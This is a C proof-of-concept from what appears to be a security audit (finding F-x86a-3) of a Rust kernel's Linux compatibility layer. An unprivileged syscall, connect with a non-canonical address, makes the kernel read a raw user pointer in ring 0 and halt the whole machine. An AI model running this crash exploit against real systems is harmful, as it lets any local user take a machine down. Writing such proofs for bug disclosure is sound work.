/* poc_connect_gp.c — F-x86a-3
 *
 * The CONNECT dispatch arm in src/arch/x86_64/linux/mod.rs (~line 172) peeks the
 * sockaddr family with a RAW user pointer and only checks `addrlen >= 2`:
 *
 *     let fam = if a[1] != 0 && a[2] >= 2 {
 *         (unsafe { core::ptr::read_unaligned(a[1] as *const u16) }) as u64
 *     } else { 1 };
 *
 * a[1] is never validated by check_user_ptr nor by the range predictor, so a
 * non-canonical address raises #GP while the CPU is in ring 0 (kernel text
 * RIP).  gp_fault_handler() only kills a Compat_Process when the FAULTING RIP
 * is a user address; a kernel RIP falls through to halt(), i.e. the whole
 * machine dies.  No socket, no privileges and no network are needed: the read
 * happens before any fd/type check.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>

#ifndef SYS_connect
#define SYS_connect 42
#endif

int main(void) {
    setgid(1000);
    setuid(1000);
    printf("POC-CONNECT-GP: uid=%d euid=%d pid=%d\n", (int)getuid(), (int)geteuid(),
           (int)getpid());
    printf("POC-CONNECT-GP: calling connect(fd=0, addr=0x8000000000000000, len=16)\n");
    fflush(stdout);
    /* Non-canonical "user" pointer: the kernel-mode u16 load #GPs. */
    long r = syscall(SYS_connect, 0, 0x8000000000000000UL, 16UL);
    /* Never reached on a vulnerable kernel. */
    printf("POC-CONNECT-GP: SURVIVED r=%ld errno=%d\n", r, errno);
    fflush(stdout);
    return 0;
}